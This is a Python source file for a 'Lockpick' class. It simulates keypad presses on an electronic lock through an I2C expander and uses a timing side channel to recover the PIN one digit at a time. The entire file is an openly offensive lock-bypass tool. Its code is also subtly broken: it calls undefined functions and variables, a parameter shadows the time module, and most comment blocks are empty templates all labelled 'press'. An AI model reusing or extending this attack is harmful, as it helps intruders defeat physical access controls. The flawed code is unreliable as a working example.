import smbus
import time

class Lockpick:
    #timeout can't be found by polling the lock
    def __init__(self, lock_type="polling", password_length=4, timeout=3.5, discover_timings=True):
        self.lock_type = lock_type
        self.password_length = password_length
        self.timeout = timeout
        self.keypad_keys = [["1", "2", "3"], ["4", "5", "6"], ["7", "8", "9"], ["#", "0", "*"]]
        self.rows = len(keypad_keys)
        self.columns = len(keypad_keys[0])
        self.i2c = smbus.SMBus(1)
        self.i2c.write_byte(0x38, 0xFF)
        self.column_bytes = [0b11110011, 0b11110101, 0b11111001]
        self.row_bytes = [0b11100001, 0b11010001, 0b10110001, 0b01110001, 0b11110001]
        #The default of the i2c chip is to set all pins to high.
        #To not poll all the columns directly we call the unpressfunction
        self.unpress()
        self.calculate_timings(discover_timings)

    #press

    #Description:

    #Parameters:

    #Returns:
    def press(self, column):
        self.i2c.write_byte(0x38, self.column_bytes[column])


    #press

    #Description:

    #Parameters:

    #Returns:
    def unpress(self):
        self.i2c.write_byte(0x38, 0b11110001)


    #press

    #Description:

    #Parameters:

    #Returns:
    def wait(self, val):
    	value = self.i2c.read_byte(0x38)
    	while self.i2c.read_byte(0x38) != self.row_bytes[val]:
    		pass


    #press

    #Description:

    #Parameters:

    #Returns:
    def press_key(self, row, column, time=False):
        if self.lock_type != "polling":
            press(column)
            time.sleep(0.005)
        wait(row)
        press(column)
        if time:
            t0 = time.time()
        time.sleep(0.005)
        unpress()
        if self.lock_type == "polling":
            wait(row)
        else:
            wait(4)
        if time:
            return time.time()-x


    #press

    #Description:
        #Analyzes the delta time between key polls
        #We assume that one key will be the correct key, thus one key will have a significantly shorter deltaT
        #We remove the correct deltaT and average the rest of the wrong deltaTs in order to calculate the threshold.
        #The threshold is used thoughout the class to determine if a key press is the correct.
    #Parameters:
        #automatic:Boolean

    def calculate_timings(self, automatic):
        if automatic:
            timings = []
            for row in range(self.rows):
                for column in range(self.columns):
                    timings.append(press_key(row, column, True))
                    time.sleep(self.timeout)
            self.correct_time = min(timings)
            timings.remove(correct_time)
            self.incorrect_time = sum(timings)/len(timings)
            self.threshold = (correct_time + incorrect_time) / 2
        else:
            self.threshold = 0.8


    #press

    #Description:

    #Parameters:

    #Returns:

    def next_key(self,digit, password):
        for row in range(self.rows):
            for column in range(self.columns):
                for i in password:
                    self.press_key(i[0], i[1])
                if get_delta_t(row, column) < threshold:
                    return row, column



    #press

    #Description:

    #Parameters:

    #Returns:

    def get_password(self):
        password = []
        for digit in range(self.password_length):
            password.append(self.next_key(digit, password))
        return password
